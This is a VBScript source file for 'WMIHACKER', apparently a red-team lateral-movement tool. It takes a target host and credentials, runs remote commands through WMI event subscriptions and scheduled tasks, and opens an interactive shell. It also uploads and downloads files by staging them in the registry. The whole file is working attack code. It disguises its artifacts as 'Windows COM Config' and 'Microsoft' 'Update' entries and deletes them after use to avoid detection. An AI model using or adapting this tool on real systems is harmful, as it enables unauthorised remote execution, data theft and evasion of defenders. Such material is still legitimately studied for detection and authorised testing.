'On Error Resume Next
Const HKEY_LOCAL_MACHINE = &H80000002
Const wbemFlagReturnImmediately = &h10
Const wbemFlagForwardOnly = &h20
'################################ Temp Result File , Change it to where you like
Const Path = "C:\Windows\Temp\"
Const FileName = "wmi.txt" 
Const timeOut = 3000 ' 1000ms = 1s
Const strKeyPath = "SOFTWARE\Classes\hello"
Const strName = "Part2"
'################################
Dim time_zone
file = Path&FileName
WScript.Echo 
WScript.Echo "__          ____  __ _____   _    _          _____ _  ________ _____  "
WScript.Echo "\ \        / /  \/  |_   _| | |  | |   /\   / ____| |/ /  ____|  __ \ "
WScript.Echo " \ \  /\  / /| \  / | | |   | |__| |  /  \ | |    | ' /| |__  | |__) |"
WScript.Echo "  \ \/  \/ / | |\/| | | |   |  __  | / /\ \| |    |  < |  __| |  _  / "
WScript.Echo "   \  /\  /  | |  | |_| |_  | |  | |/ ____ \ |____| . \| |____| | \ \ "
WScript.Echo "    \/  \/   |_|  |_|_____| |_|  |_/_/    \_\_____|_|\_\______|_|  \_\"
WScript.Echo "			      v0.6beta       By. Xiangshan@360RedTeam "
Set objArgs = WScript.Arguments
intArgCount = objArgs.Count
If intArgCount < 2 Or intArgCount > 6 Then
	WScript.Echo "Usage: " & _
		vbNewLine & vbTab & "WMIHACKER.vbs  /cmd  host  user  pass  command GETRES?" & vbNewLine & _
        vbNewLine & vbTab & "WMIHACKER.vbs  /shell  host  user  pass " & vbNewLine & _
        vbNewLine & vbTab & "WMIHACKER.vbs  /upload  host  user  pass  localpath remotepath" & vbNewLine & _
        vbNewLine & vbTab & "WMIHACKER.vbs  /download  host  user  pass  localpath remotepath" & vbNewLine & _
		vbNewLine & vbTab & "  /cmd" & vbTab & vbTab & "single command mode" & _
		vbNewLine & vbTab & "  host" & vbTab & vbTab & "hostname or IP address" & _
        vbNewLine & vbTab & "  GETRES?" & vbTab & "Res Need Or Not, Use 1 Or 0" & _
		vbNewLine & vbTab & "  command" & vbTab & "the command to run on remote host"
	WScript.Quit()
End If
host = objArgs.Item(1)
If objArgs.Item(0) = "/cmd" Then
    user = objArgs.Item(2)
    pass = objArgs.Item(3)
    command = objArgs.Item(4)
    getres = objArgs.Item(5)
ElseIf objArgs.Item(0) = "/shell" Then 
    user = objArgs.Item(2)
    pass = objArgs.Item(3)
Else
    user = objArgs.Item(2)
    pass = objArgs.Item(3)
    localpath = objArgs.Item(4)
    remotepath = objArgs.Item(5)
End If
WScript.Echo "WMIHACKER : Target -> " & host
WScript.Echo "WMIHACKER : Connecting..."
Set objLocator = CreateObject("wbemscripting.swbemlocator")
If intArgCount >2 Then
	if user = "-" And pass = "-" Then
		set objWMIService = objLocator.connectserver(host,"root/cimv2")
		Set SubobjSWbemServices = objLocator.ConnectServer(host, "root\subscription")
		Set regWMIService = objLocator.ConnectServer(host, "root\default")
	Else
		set objWMIService = objLocator.connectserver(host,"root/cimv2",user,pass)
		Set SubobjSWbemServices = objLocator.ConnectServer(host, "root\subscription", user, pass)
		Set regWMIService = objLocator.ConnectServer(host, "root\default", user, pass)
	End IF
Else
	Set objWMIService = objLocator.ConnectServer(host,"root/cimv2")
End If
If Err.Number <> 0 Then
	WScript.Echo "WMIHACKER ERROR: " & Err.Description 
	WScript.Quit
End If
WScript.Echo "WMIHACKER : Login -> OK"
strQuery = "SELECT * FROM Win32_OperatingSystem"
set colItems = objWMIService.ExecQuery(strQuery,"WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
For Each objItem in colItems
    'wscript.echo objItem.Version
    TargetVersionSet = objItem.Version
Next
TargetVersionSet = Split(TargetVersionSet,".")
TargetVersion =  TargetVersionSet(0)

if objArgs.Item(0) = "/cmd" Then
    WScript.Echo vbTab & host & "  >>  " & command
    If TargetVersion < 6 Then
        exec_time = GetTime()
        if getres = 1 Then
            AddJobWithRes command,file,exec_time,time_zone
            WriteReg file
            ReadResult TargetVersion
            deletefile file
        Else
            AddJobWithoutRes command,exec_time,time_zone
        End If
        
    Else
        If getres = 1 Then
            ' Add Task to the Machine.
            command = Replace(command,"""", chr(34) & " & chr(34) & " & chr(34))
            AddSCHTASKWithres command, file
            WriteReg file
            ' read the res of exec and save it to reg
            ReadResult TargetVersion
            deletefile file
        Else
            command = Replace(command,"""", chr(34) & " & chr(34) & " & chr(34))
            AddSCHTASKWithoutres command
            wscript.echo "Done!"
        End If
    End If
Elseif objArgs.Item(0) = "/upload" Then
    Upload localpath,remotepath
Elseif objArgs.Item(0) = "/download" Then
    Download localpath,remotepath
Elseif objArgs.Item(0) = "/shell" Then
    WScript.Echo("WMIHACKER : Welcome to WMIHACKER Shell")
    Do While True
        wscript.stdout.write("WMIHACKER : CMD > ")
        command = wscript.stdin.ReadLine
        If LCase(Trim(command)) = "exit" Then Exit Do
        WScript.Echo vbTab & host & "  >>  " & command
        If TargetVersion < 6 Then
            exec_time = GetTime()
            AddJobWithRes command,file,exec_time,time_zone
            WriteReg file
            ReadResult TargetVersion
            deletefile file
        Else
            command = Replace(command,"""", chr(34) & " & chr(34) & " & chr(34))
            ' Add Task to the Machine.
            AddSCHTASKWithres command, file
            WriteReg file
            ' read the res of exec and save it to reg
            ReadResult TargetVersion
            deletefile file
        End If
    loop
End If
WScript.Quit

Function AddSCHTASKWithoutres(cmd)
    Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    Dim Schedule_Name
    Schedule_Name = genStr(6,12)
    wscript.echo "WMIHACKER : The Schedule Name is " &Schedule_Name
    asec.name="Windows COM Config Consumer"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = "Const TriggerTypeDaily = 1 "&chr(10)&_
    "Const ActionTypeExec = 0 "&chr(10)&_
    "Set service = CreateObject(" &chr(34)&"Schedule.Service" &chr(34)&")"&chr(10)&_
    "Call service.Connect"&chr(10)&_
    "Dim rootFolder"&chr(10)&_
    "Set rootFolder = service.GetFolder(" &chr(34)&"\" &chr(34)&")"&chr(10)&_
    "Dim taskDefinition"&chr(10)&_
    "Set taskDefinition = service.NewTask(0)"&chr(10)&_
    "Dim regInfo"&chr(10)&_
    "Set regInfo = taskDefinition.RegistrationInfo"&chr(10)&_
    "regInfo.Description = " &chr(34)&"Update" &chr(34)&""&chr(10)&_
    "regInfo.Author = " &chr(34)&"Microsoft" &chr(34)&""&chr(10)&_
    "Dim settings"&chr(10)&_
    "Set settings = taskDefinition.settings"&chr(10)&_
    "settings.Enabled = True"&chr(10)&_
    "settings.StartWhenAvailable = True"&chr(10)&_
    "settings.Hidden = False"&chr(10)&_
    "settings.DisallowStartIfOnBatteries = False"&chr(10)&_
    "Dim triggers"&chr(10)&_
    "Set triggers = taskDefinition.triggers"&chr(10)&_
    "Dim trigger"&chr(10)&_
    "Set trigger = triggers.Create(7)"&chr(10)&_
    "Dim Action"&chr(10)&_
    "Set Action = taskDefinition.Actions.Create(ActionTypeExec)"&chr(10)&_
    "Action.Path = " &chr(34)&"c:\windows\system32\cmd.exe" &chr(34)&""&chr(10)&_
    "Action.arguments = chr(34) & " &chr(34)&"/c "&cmd&chr(34)&" & chr(34)"&chr(10)&_
    "Dim objNet, LoginUser"&chr(10)&_
    "Set objNet = CreateObject(" &chr(34)&"WScript.Network" &chr(34)&")"&chr(10)&_
    "LoginUser = objNet.UserName"&chr(10)&_
    "    If UCase(LoginUser) = " &chr(34)&"SYSTEM" &chr(34)&" Then"&chr(10)&_
    "    Else"&chr(10)&_
    "    LoginUser = Empty"&chr(10)&_
    "    End If"&chr(10)&_
    "Call rootFolder.RegisterTaskDefinition(" & chr(34) & Schedule_Name &chr(34)&", taskDefinition, 6, LoginUser, , 3)"&chr(10)&_
    "Call rootFolder.DeleteTask(" &chr(34)& Schedule_Name &chr(34)&",0)"
    set asecpath=asec.put_                                        

    Set temp = SubobjSWbemServices.Get("__EventFilter")
    set evtflt = temp.spawninstance_
    evtflt.name="Windows COM Config Filter" 
    evtflt.EventNameSpace="root\cimv2"                         
    qstr = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    evtflt.query=qstr                                             
    evtflt.querylanguage="wql"                                    
    set fltpath=evtflt.put_                                       

    Set temp = SubobjSWbemServices.Get("__FilterToConsumerBinding")
    set fcbnd = temp.spawninstance_
    fcbnd.consumer=asecpath.path
    fcbnd.filter=fltpath.path
    fcbnd.put_

    WScript.Sleep 2000 ' 2 sec
    evtflt.delete_
    asec.delete_
    fcbnd.delete_
    wscript.echo "WMIHACKER : COMMAND EXEC SUCCESS."
End Function

Function AddSCHTASKWithres(cmd,file)
    Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    Dim Schedule_Name
    Schedule_Name = genStr(6,12)
    wscript.echo "WMIHACKER : The Schedule Name is " &Schedule_Name
    asec.name="Windows COM Config Consumer"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = "Const TriggerTypeDaily = 1 "&chr(10)&_
    "Const ActionTypeExec = 0 "&chr(10)&_
    "Set service = CreateObject(" &chr(34)&"Schedule.Service" &chr(34)&")"&chr(10)&_
    "Call service.Connect"&chr(10)&_
    "Dim rootFolder"&chr(10)&_
    "Set rootFolder = service.GetFolder(" &chr(34)&"\" &chr(34)&")"&chr(10)&_
    "Dim taskDefinition"&chr(10)&_
    "Set taskDefinition = service.NewTask(0)"&chr(10)&_
    "Dim regInfo"&chr(10)&_
    "Set regInfo = taskDefinition.RegistrationInfo"&chr(10)&_
    "regInfo.Description = " &chr(34)&"Update" &chr(34)&""&chr(10)&_
    "regInfo.Author = " &chr(34)&"Microsoft" &chr(34)&""&chr(10)&_
    "Dim settings"&chr(10)&_
    "Set settings = taskDefinition.settings"&chr(10)&_
    "settings.Enabled = True"&chr(10)&_
    "settings.StartWhenAvailable = True"&chr(10)&_
    "settings.Hidden = False"&chr(10)&_
    "settings.DisallowStartIfOnBatteries = False"&chr(10)&_
    "Dim triggers"&chr(10)&_
    "Set triggers = taskDefinition.triggers"&chr(10)&_
    "Dim trigger"&chr(10)&_
    "Set trigger = triggers.Create(7)"&chr(10)&_
    "Dim Action"&chr(10)&_
    "Set Action = taskDefinition.Actions.Create(ActionTypeExec)"&chr(10)&_
    "Action.Path = " &chr(34)&"c:\windows\system32\cmd.exe" &chr(34)&""&chr(10)&_
    "Action.arguments = chr(34) & " &chr(34)&"/c "&cmd&" > "&file&"" &chr(34)&" & chr(34)"&chr(10)&_
    "Dim objNet, LoginUser"&chr(10)&_
    "Set objNet = CreateObject(" &chr(34)&"WScript.Network" &chr(34)&")"&chr(10)&_
    "LoginUser = objNet.UserName"&chr(10)&_
    "    If UCase(LoginUser) = " &chr(34)&"SYSTEM" &chr(34)&" Then"&chr(10)&_
    "    Else"&chr(10)&_
    "    LoginUser = Empty"&chr(10)&_
    "    End If"&chr(10)&_
    "Call rootFolder.RegisterTaskDefinition(" & chr(34) & Schedule_Name &chr(34)&", taskDefinition, 6, LoginUser, , 3)"&chr(10)&_
    "Call rootFolder.DeleteTask(" &chr(34)& Schedule_Name &chr(34)&",0)"
    set asecpath=asec.put_                                        

    Set temp = SubobjSWbemServices.Get("__EventFilter")
    set evtflt = temp.spawninstance_
    evtflt.name="Windows COM Config Filter" 
    evtflt.EventNameSpace="root\cimv2"                         
    qstr = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    evtflt.query=qstr                                             
    evtflt.querylanguage="wql"                                    
    set fltpath=evtflt.put_                                       

    Set temp = SubobjSWbemServices.Get("__FilterToConsumerBinding")
    set fcbnd = temp.spawninstance_
    fcbnd.consumer=asecpath.path
    fcbnd.filter=fltpath.path
    fcbnd.put_

    WScript.Sleep 2000 ' 2 sec
    evtflt.delete_
    asec.delete_
    fcbnd.delete_
    ReplacedFile = Replace(file,"\","\\")
    strQuery = "SELECT * FROM CIM_DataFile where name="&chr(34)&ReplacedFile&chr(34)
    Dim done
    done = false
    Do Until done
        Wscript.Sleep 2000
        Set colItems = objWMIService.ExecQuery(strQuery, "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
        For Each objItem in colItems
            return = objItem.GetEffectivePermission(2)
            If return Then
                WScript.Echo "WMIHACKER : File Write Success. "
                done = True
            Else
                WScript.Echo "WMIHACKER : COMMAND EXECTING... "
            End If
        Next
    loop
    wscript.echo "WMIHACKER : COMMAND EXEC SUCCESS, Wait to write in reg."
End Function

Function WriteReg(file)
    Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    asec.name="Windows COM Config Consumer"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = "set ws=createobject(" & chr(34) & "wscript.shell" & chr(34) & ")"&chr(10)&_
    "set fs = createobject(" & chr(34) & "scripting.filesystemobject" & chr(34) & ")"&chr(10)&_
    "set ts = fs.opentextfile(" & chr(34) & file & chr(34) &",1)"&chr(10)&_
    "content= ts.readall"&chr(10)&_
    "ts.close"&chr(10)&_
    "b64_content = Base64Encode(content, false)"&chr(10)&_
    "path=" & chr(34) & "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\hello\" & chr(34) & ""&chr(10)&_
    "val=ws.regwrite(path&" & chr(34) & "part1" & chr(34) & ",b64_content)"&chr(10)&_
    "Function Base64Encode(ByVal sText, ByVal fAsUtf16LE)"&chr(10)&_
    "    With CreateObject(" & chr(34) & "Msxml2.DOMDocument" & chr(34) & ").CreateElement(" & chr(34) & "aux" & chr(34) & ")"&chr(10)&_
    "        .DataType = " & chr(34) & "bin.base64" & chr(34) & ""&chr(10)&_
    "        if fAsUtf16LE then"&chr(10)&_
    "            .NodeTypedValue = StrToBytes(sText, " & chr(34) & "utf-16le" & chr(34) & ", 2)"&chr(10)&_
    "        else"&chr(10)&_
    "            .NodeTypedValue = StrToBytes(sText, " & chr(34) & "utf-8" & chr(34) & ", 3)"&chr(10)&_
    "        end if"&chr(10)&_
    "        Base64Encode = .Text"&chr(10)&_
    "    End With"&chr(10)&_
    "End Function"&chr(10)&_
    "function StrToBytes(ByVal sText, ByVal sTextEncoding, ByVal iBomByteCount)"&chr(10)&_
    "    With CreateObject(" & chr(34) & "ADODB.Stream" & chr(34) & ")"&chr(10)&_
    "        .Type = 2"&chr(10)&_
    "        .Charset = sTextEncoding"&chr(10)&_
    "        .Open"&chr(10)&_
    "        .WriteText sText"&chr(10)&_
    ""&chr(10)&_
    "        .Position = 0 "&chr(10)&_
    "        .Type = 1  "&chr(10)&_
    "        .Position = iBomByteCount "&chr(10)&_
    "        StrToBytes = .Read"&chr(10)&_
    "        .Close"&chr(10)&_
    "    End With "&chr(10)&_
    "end function"
    'wscript.echo Asec.scripttext
    set asecpath=asec.put_                                        

    Set temp = SubobjSWbemServices.Get("__EventFilter")
    set evtflt = temp.spawninstance_
    evtflt.name="Windows COM Config Filter" 
    evtflt.EventNameSpace="root\cimv2"                         
    qstr = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    evtflt.query=qstr                                             
    evtflt.querylanguage="wql"                                    
    set fltpath=evtflt.put_                                       

    Set temp = SubobjSWbemServices.Get("__FilterToConsumerBinding")
    set fcbnd = temp.spawninstance_
    fcbnd.consumer=asecpath.path
    fcbnd.filter=fltpath.path
    fcbnd.put_

    WScript.Sleep 2000 ' 2 sec
    evtflt.delete_
    asec.delete_
    fcbnd.delete_
    wscript.echo "WMIHACKER : REG WRITE SUCCESS, Wait to read the res."
End Function

Function ReadResult(Version)
    Dim Res32, Res64
    if Version < 6 Then
        Res32 =  GetStringValue (".", HKEY_LOCAL_MACHINE, "SOFTWARE\Classes\hello\", "part1", 32, Version)
        wscript.echo Base64Decode(Res32,False)
    else
        Res32 =  GetStringValue (".", HKEY_LOCAL_MACHINE, "SOFTWARE\Classes\hello\", "part1", 32, Version)
        Res64 = GetStringValue (".", HKEY_LOCAL_MACHINE, "SOFTWARE\Classes\hello\", "part1", 64, Version)
        If Res32 = Empty Then
            wscript.echo Base64Decode(Res64,False)
        else
            wscript.echo Base64Decode(Res32,False)
        end if
    End if
End Function

Function GetStringValue (ByVal Resource, ByVal hDefKey, ByVal SubKeyName, ByVal ValueName, ByVal Architecture, ByVal Version)
    Set oReg = regWMIService.Get("StdRegProv")
    Dim oCtx: Set oCtx = CreateObject("WbemScripting.SWbemNamedValueSet")
    oCtx.Add "__ProviderArchitecture", Architecture
    oCtx.Add "__RequiredArchitecture", True
    Dim oInParams: Set oInParams = oReg.Methods_("GetStringValue").InParameters
    oInParams.hDefKey = hDefKey
    oInParams.sSubKeyName = SubKeyName
    oInParams.sValueName = ValueName
    Dim oOutParams: Set oOutParams = oReg.ExecMethod_("GetStringValue", oInParams, , oCtx)
    GetStringValue = oOutParams.sValue
End Function

function BytesToStr(ByVal byteArray, ByVal sTextEncoding)
    If LCase(sTextEncoding) = "utf-16le" then
        ' UTF-16 LE happens to be VBScript's internal encoding, so we can
        ' take a shortcut and use CStr() to directly convert the byte array
        ' to a string.
        BytesToStr = CStr(byteArray)
    Else ' Convert the specified text encoding to a VBScript string.
        ' Create a binary stream and copy the input byte array to it.
        With CreateObject("ADODB.Stream")
            .Type = 1 ' adTypeBinary
            .Open
            .Write byteArray
            ' Now change the type to text, set the encoding, and output the 
            ' result as text.
            .Position = 0
            .Type = 2 ' adTypeText
            .CharSet = sTextEncoding
            BytesToStr = .ReadText
            .Close
        End With
    End If
end function

Function Base64Decode(ByVal sBase64EncodedText, ByVal fIsUtf16LE)
    Dim sTextEncoding
    if fIsUtf16LE Then sTextEncoding = "utf-16le" Else sTextEncoding = "utf-8"
    ' Use an aux. XML document with a Base64-encoded element.
    ' Assigning the encoded text to .Text makes the decoded byte array
    ' available via .nodeTypedValue, which we can pass to BytesToStr()
    With CreateObject("Msxml2.DOMDocument").CreateElement("aux")
        .DataType = "bin.base64"
        .Text = sBase64EncodedText
        Base64Decode = BytesToStr(.NodeTypedValue, sTextEncoding)
    End With
End Function

Function randNum(lowerbound,upperbound)
    Randomize Time()
    randNum =  Int((upperbound - lowerbound + 1) * Rnd + lowerbound)
End Function

Function genStr(n,m)
    Dim a, z, s, i, p, k
    Dim arr()
    For i = 0 To 9
        ReDim Preserve arr(i)
        arr(i) = Chr(Asc("0") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("a") + i)
    Next
    k = UBound(arr)
    For i = 0 To 25
        Redim Preserve arr(k+1+i)
        arr(k+1+i) = Chr(Asc("A") + i)
    Next
    a = 0
    z = UBound(arr)
    s = ""
    p = randNum(n, m)
    For i = 1 To p
        s = s & arr(randNum(a, z))
    Next
    genStr = s
End Function

Function AddJobWithRes(cmd,file,exec_time,time_zone)
    exec_time = "********"&exec_time&"00.000000"&time_zone
	command = "c:\windows\system32\cmd.exe /c " & cmd & " > " & file
    Set objNewJob = objWMIService.Get("Win32_ScheduledJob")
    errJobCreated = objNewJob.Create(command, exec_time, True , , , True, JobId)
    If errJobCreated <> 0 Then
		Wscript.Echo "WMIHACKER : Error on task creation"
    Else
		Wscript.Echo "WMIHACKER : Task created Wait For Exec...(Max Time is 00:59)"
    End If
    ReplacedFile = Replace(file,"\","\\")
    strQuery = "SELECT * FROM CIM_DataFile where name="&chr(34)&ReplacedFile&chr(34)
    Dim done
    done = false
    Do Until done
        Wscript.Sleep 2000
        Set colItems = objWMIService.ExecQuery(strQuery, "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
        For Each objItem in colItems
            WScript.Echo "WMIHACKER : File Write Success. "
            done = true
        Next
    loop
End Function

Function AddJobWithoutRes(cmd,exec_time,time_zone)
    exec_time = "********"&exec_time&"00.000000"&time_zone
	command = "c:\windows\system32\cmd.exe /c " & cmd 
    Set objNewJob = objWMIService.Get("Win32_ScheduledJob")
    errJobCreated = objNewJob.Create(command, exec_time, True , , , True, JobId)
    If errJobCreated <> 0 Then
		Wscript.Echo "WMIHACKER : Error on task creation"
    Else
		Wscript.Echo "WMIHACKER : Done. Task created Wait For Exec...(Max Time is 00:59)"
    End If
End Function

Function deletefile(file)
	ReplacedFile = Replace(file,"\","\\")
	'wscript.echo ReplacedFile
    strQuery = "SELECT * FROM CIM_DataFile where name="&chr(34)&ReplacedFile&chr(34)
	Set colItems = objWMIService.ExecQuery(strQuery, "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
	For Each objItem in colItems
		objItem.delete_
	Next
End Function

Function GetTime()
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_TimeZone", "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly )
    For Each objItem In colItems
        time_zone = objItem.Bias
		if time_zone > 0 Then
			time_zone = "+" & time_zone
		End IF
    Next
    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_LocalTime", "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly )
    For Each objItem In colItems
        If objItem.Hour < 10 Then 
            exec_time = "0" & objItem.Hour & ":"
        Else 
            exec_time = objItem.Hour & ":"
        End If
        If objItem.Minute < 10 Then 
            exec_time = exec_time & "0" & objItem.Minute & ":"
        Else 
            exec_time = exec_time & objItem.Minute & ":"
        End If
        If objItem.Second < 10 Then 
            exec_time = exec_time & "0" & objItem.Second
        Else 
            exec_time = exec_time & objItem.Second
        End If
    Next
    temp_time = DateAdd("s",61,CDate(exec_time))
    temp_time = Split(temp_time,":")
	if temp_time(0) < 10 Then
		temp_time(0) = "0" & temp_time(0)
	End IF 
    exec_time = temp_time(0) & temp_time(1) 
    GetTime = exec_time
End Function

Function Download(localpath,remotepath)
	ReadFileFromReg(remotepath)
	Set objRegistry = regWMIService.Get("StdRegProv")
	retcode = objRegistry.GetBinaryValue(HKEY_LOCAL_MACHINE, strKeyPath, strName, arrData)
	WriteBinary localpath, arrData
    Wscript.Echo "File Download Success"
End Function

Function Upload(localpath,remotepath)
	arrData = ReadBinary(localpath)
	Set objRegistry = regWMIService.Get("StdRegProv")
	objRegistry.CreateKey HKEY_LM, strKeyPath
	retcode = objRegistry.SetBinaryValue(HKEY_LOCAL_MACHINE, strKeyPath, strName, arrData)
	If (retcode = 0) And (Err.Number = 0) Then
	  WScript.Echo "Binary value added successfully"
	Else
	  WScript.Echo "An error occurred. Return code: " & retcode
	End If
	WriteFileFromReg(remotepath)
End Function

Function ReadFileFromReg(file)
	Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    asec.name="Windows COM Config Consumer"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = "arrData=ReadBinary(" & chr(34) & file & chr(34) & ")"&chr(10)&_
		"Set objRegistry = GetObject(" & chr(34) & "winmgmts:{impersonationLevel=impersonate}!\\" & chr(34) & " & " & chr(34) & "." & chr(34) & " & " & chr(34) & "\root\default:StdRegProv" & chr(34) & ")"&chr(10)&_
		"objRegistry.CreateKey 2147483650, " & chr(34) & "SOFTWARE\Classes\hello" & chr(34) & ""&chr(10)&_
		"retcode = objRegistry.SetBinaryValue(2147483650, " & chr(34) & "SOFTWARE\Classes\hello" & chr(34) & "," & chr(34) & "Part2" & chr(34) & ", arrData)"&chr(10)&_
		"Function ReadBinary(FileName)"&chr(10)&_
		"  Dim Buf(), I"&chr(10)&_
		"  With CreateObject(" & chr(34) & "ADODB.Stream" & chr(34) & ")"&chr(10)&_
		"    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName"&chr(10)&_
		"    ReDim Buf(.Size - 1)"&chr(10)&_
		"    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next"&chr(10)&_
		"    .Close"&chr(10)&_
		"  End With"&chr(10)&_
		"  ReadBinary = Buf"&chr(10)&_
		"End Function"
    set asecpath=asec.put_                                        

    Set temp = SubobjSWbemServices.Get("__EventFilter")
    set evtflt = temp.spawninstance_
    evtflt.name="Windows COM Config Filter" 
    evtflt.EventNameSpace="root\cimv2"                         
    qstr = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    evtflt.query=qstr                                             
    evtflt.querylanguage="wql"                                    
    set fltpath=evtflt.put_                                       

    Set temp = SubobjSWbemServices.Get("__FilterToConsumerBinding")
    set fcbnd = temp.spawninstance_
    fcbnd.consumer=asecpath.path
    fcbnd.filter=fltpath.path
    fcbnd.put_

    WScript.Sleep 2000 ' 2 sec
    evtflt.delete_
    asec.delete_
    fcbnd.delete_
    ReplacedFile = Replace(file,"\","\\")
    strQuery = "SELECT * FROM CIM_DataFile where name="&chr(34)&ReplacedFile&chr(34)
    WScript.Echo "Read File To Reg Success"
End Function

Function WriteFileFromReg(file)
	Set temp = SubobjSWbemServices.Get("ActiveScriptEventConsumer")
    Set asec = temp.spawninstance_
    asec.name="Windows COM Config Consumer"
    Asec.scriptingengine="vbscript"
    Asec.scripttext = "Set objRegistry = GetObject(" & chr(34) & "winmgmts:{impersonationLevel=impersonate}!\\" & chr(34) & " & " & chr(34) & "." & chr(34) & " & " & chr(34) & "\root\default:StdRegProv" & chr(34) & ")"&chr(10)&_
		"objRegistry.GetBinaryValue 2147483650," & chr(34) & "SOFTWARE\Classes\hello" & chr(34) & "," & chr(34) & "Part2" & chr(34) & ",strValue"&chr(10)&_
		"WriteBinary "&Chr(34)&file&chr(34)&",strValue"&chr(10)&_
		"Sub WriteBinary(FileName, Buf)"&chr(10)&_
		"  Dim I, aBuf, Size, bStream"&chr(10)&_
		"  Size = UBound(Buf): ReDim aBuf(Size \ 2)"&chr(10)&_
		"  For I = 0 To Size - 1 Step 2"&chr(10)&_
		"      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))"&chr(10)&_
		"  Next"&chr(10)&_
		"  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))"&chr(10)&_
		"  aBuf=Join(aBuf, " & chr(34) & "" & chr(34) & ")"&chr(10)&_
		"  Set bStream = CreateObject(" & chr(34) & "ADODB.Stream" & chr(34) & ")"&chr(10)&_
		"  bStream.Type = 1: bStream.Open"&chr(10)&_
		"  With CreateObject(" & chr(34) & "ADODB.Stream" & chr(34) & ")"&chr(10)&_
		"    .Type = 2 : .Open: .WriteText aBuf"&chr(10)&_
		"    .Position = 2: .CopyTo bStream: .Close"&chr(10)&_
		"  End With"&chr(10)&_
		"  bStream.SaveToFile FileName, 2: bStream.Close"&chr(10)&_
		"  Set bStream = Nothing"&chr(10)&_
		"End Sub"
    set asecpath=asec.put_                                        

    Set temp = SubobjSWbemServices.Get("__EventFilter")
    set evtflt = temp.spawninstance_
    evtflt.name="Windows COM Config Filter" 
    evtflt.EventNameSpace="root\cimv2"                         
    qstr = "SELECT * FROM __InstanceModificationEvent WITHIN 1 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
    evtflt.query=qstr                                             
    evtflt.querylanguage="wql"                                    
    set fltpath=evtflt.put_                                       

    Set temp = SubobjSWbemServices.Get("__FilterToConsumerBinding")
    set fcbnd = temp.spawninstance_
    fcbnd.consumer=asecpath.path
    fcbnd.filter=fltpath.path
    fcbnd.put_

    WScript.Sleep 2000 ' 2 sec
    evtflt.delete_
    asec.delete_
    fcbnd.delete_
    ReplacedFile = Replace(file,"\","\\")
    strQuery = "SELECT * FROM CIM_DataFile where name="&chr(34)&ReplacedFile&chr(34)
    Dim done
    done = false
    Do Until done
        Wscript.Sleep 2000
        Set colItems = objWMIService.ExecQuery(strQuery, "WQL", wbemFlagReturnImmediately + wbemFlagForwardOnly)
        For Each objItem in colItems
            WScript.Echo "WMIHACKER : File Upload Success. "
            done = true
        Next
    loop
End Function

Function ReadBinary(FileName)
  Dim Buf(), I
  With CreateObject("ADODB.Stream")
    .Mode = 3: .Type = 1: .Open: .LoadFromFile FileName
    ReDim Buf(.Size - 1)
    For I = 0 To .Size - 1: Buf(I) = AscB(.Read(1)): Next
    .Close
  End With
  ReadBinary = Buf
End Function

Sub WriteBinary(FileName, Buf)
  Dim I, aBuf, Size, bStream
  Size = UBound(Buf): ReDim aBuf(Size \ 2)
  For I = 0 To Size - 1 Step 2
      aBuf(I \ 2) = ChrW(Buf(I + 1) * 256 + Buf(I))
  Next
  If I = Size Then aBuf(I \ 2) = ChrW(Buf(I))
  aBuf=Join(aBuf, "")
  Set bStream = CreateObject("ADODB.Stream")
  bStream.Type = 1: bStream.Open
  With CreateObject("ADODB.Stream")
    .Type = 2 : .Open: .WriteText aBuf
    .Position = 2: .CopyTo bStream: .Close
  End With
  bStream.SaveToFile FileName, 2: bStream.Close
  Set bStream = Nothing
End Sub